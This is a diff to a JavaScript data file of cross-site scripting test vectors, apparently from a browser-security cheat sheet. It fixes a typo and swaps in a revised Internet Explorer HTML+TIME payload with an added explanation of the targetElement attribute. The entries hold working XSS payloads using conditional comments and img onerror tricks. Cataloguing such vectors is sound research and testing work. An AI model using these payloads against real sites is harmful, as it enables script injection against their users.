@@ -3960,7 +3960,7 @@ var items =
         },
         'data'       : '<!--[if]><script>%js_alert%</script -->\r\n<!--[if<img src=x onerror=%js_alert%//]> -->',        
         'description': {
-            'en' : 'Conditional comments on Internet Explorer can cause trouble as soon as an attcker is able to inject rectangular brackets wrapping the words if and endif with almost arbitrary suffixes. A condition always being true will lead to immediate parsing of the enclosed markup on all tested Internet Explorer versions. The second example injects an <img> tag into the comment condition leading to immediate JavaScript execution as well.',
+            'en' : 'Conditional comments on Internet Explorer can cause trouble as soon as an attacker is able to inject rectangular brackets wrapping the words if and endif with almost arbitrary suffixes. A condition always being true will lead to immediate parsing of the enclosed markup on all tested Internet Explorer versions. The second example injects an <img> tag into the comment condition leading to immediate JavaScript execution as well.',
             'ja' : '',
             'ru' : '',
             'cs' : '',
@@ -3990,9 +3990,9 @@ var items =
             'cs' : '',
             'de' : ''
         },
-        'data'       : '<xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time">\r\n<import namespace="t" implementation="#default#time2">\r\n<t:set attributeName="innerHTML" to="&lt;SCRIPT DEFER&gt;%js_alert%&lt;/SCRIPT&gt;">',        
+        'data'       : '<div id="x">x</div>\n<xml:namespace prefix="t">\n<import namespace="t" implementation="#default#time2">\n<t:set attributeName="innerHTML" targetElement="x" to="&lt;img&#11;src=x:x&#11;onerror&#11;=%js_alert%&gt;">',        
         'description': {
-            'en' : 'Internet Explorer allows to apply namespaces and attach behaviors not only by using CSS but <import> or <?import> tags. The example shows how to work with HTML+TIME behaviors without using style attributes or tags and cause script execution via the to attribute.',
+            'en' : 'Internet Explorer allows to apply namespaces and attach behaviors not only by using CSS but <import> or <?import> tags. The example shows how to work with HTML+TIME behaviors without using style attributes or tags and cause script execution via the to attribute. If there is no attribute "targetElement",  will be overridden "innerHTML" property of the <body> tag. To limit the area that be changed, you can use the attribute "targetElement".',
             'ja' : '',
             'ru' : '',
             'cs' : '',
